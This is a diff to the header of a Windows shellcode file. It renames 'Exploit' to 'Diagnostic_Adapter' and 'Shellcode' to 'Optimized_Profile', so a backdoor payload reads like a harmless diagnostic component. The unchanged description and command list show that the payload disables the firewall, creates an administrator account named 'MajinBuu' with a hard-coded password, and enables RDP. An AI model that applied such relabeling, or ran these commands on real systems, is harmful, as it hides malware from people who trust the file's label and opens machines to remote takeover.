@@ -1,9 +1,9 @@
 /*
-## Exploit Title: Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Shellcode (644 Bytes)
-## Exploit Author: Bobby Cooke
+## Diagnostic_Adapter Title: Windows/x86 - MSVCRT System + Dynamic Null-free + Add RDP Admin + Disable Firewall + Enable RDP Optimized_Profile (644 Bytes)
+## Diagnostic_Adapter Author: Bobby Cooke
 ## Date: 2020-04-20
 ## Tested on:   Windows 10 Home - 1909 (x86_64), Windows 10 Pro - 1909 (x86)
-## Description: Windows Shellcode that disables the Windows firewall, adds the user 'MajinBuu' with password 'TurnU2C@ndy!!' to the system, adds the user 'MajinBuu' to the local groups 'Administrators' & 'Remote Desktop Users', and then enables the RDP Service.
+## Description: Windows Optimized_Profile that disables the Windows firewall, adds the user 'MajinBuu' with password 'TurnU2C@ndy!!' to the system, adds the user 'MajinBuu' to the local groups 'Administrators' & 'Remote Desktop Users', and then enables the RDP Service.
 ## Commands used:
 ##  'netsh firewall set opmode mode=DISABLE'
 ##  'net user MajinBuu TurnU2C@ndy!! /add'
